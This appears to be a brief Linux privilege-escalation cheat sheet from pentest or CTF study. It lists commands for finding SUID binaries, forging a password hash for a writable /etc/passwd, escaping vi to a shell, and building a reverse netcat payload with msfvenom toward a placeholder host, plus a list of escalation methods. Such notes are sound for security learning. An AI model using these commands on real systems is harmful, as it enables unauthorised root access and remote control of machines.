+ Starting a python server to serve files:
	`python -m SimpleHTTPServer 8000`
+ Looking for SUID binaries:
	`find / -perm -u=s -type f 2>/dev/null`
+ Creating a Linux complaint password hash:
	`openssl passwd -1 -salt [salt] [password]`
+ Using GTFOBins:
	https://gtfobins.github.io/
+ Escaping vi to shell:
	`:!sh`
+ Creating reverse nc payload using msfvenom:
	`msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`

Methodologies:
+ Abusing SUID/GUID Files
+ Exploiting writable /etc/passwd
+ Escaping vi editor
+ Exploiting crontab
+ Exploiting PATH variable
